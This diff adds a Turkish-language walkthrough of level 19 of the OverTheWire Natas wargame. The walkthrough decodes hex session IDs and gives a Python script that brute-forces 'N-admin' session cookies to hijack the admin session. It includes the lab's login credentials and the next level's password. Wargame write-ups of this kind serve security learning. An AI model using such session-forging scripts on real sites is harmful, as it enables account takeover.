@@ -179,3 +179,35 @@ Diğer sayfadan farklı olarak session id'lerin sıralı olmadığını söylenm
 <figure>
 <img src="/assets/img/natas/natas196.png">
 </figure>
+
+Tüm sessionlarda ortak olan 2d ifadesi. Bununla birlikte  0-9 arasında rakamlar , a-f ile arasında karakterler kullanılmış. Session id hex formatında olabilir. Dönüştürmeyi denediğimizde ;
+
+burcu:123456|       33382d6275726375  |       38-burcu
+
+admin:admin |       3538372d61646d696e|       587-admin
+
+a:          |       3239312d61        |       291-a
+
+
+- karakterinden öncesi muhtemelen bir önceki soruda verildiği gibi 1,640 arasında random olarak üretiliyor.
+
+{% highlight python %}
+
+import requests
+from requests.auth import HTTPBasicAuth
+auth=HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
+for id in range(650):
+               sessid=''+str(id)+'-admin'
+               sessid=sessid.encode("hex")
+               cookie={'PHPSESSID':''+sessid+''}
+               print cookie
+               s=requests.get('http://natas19.natas.labs.overthewire.org',auth=auth,cookies=cookie)
+               if "You are an admin"  in s.text:
+                        print s.text
+                        break
+
+{% endhighlight %}
+
+>> natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+
+#### Level 20
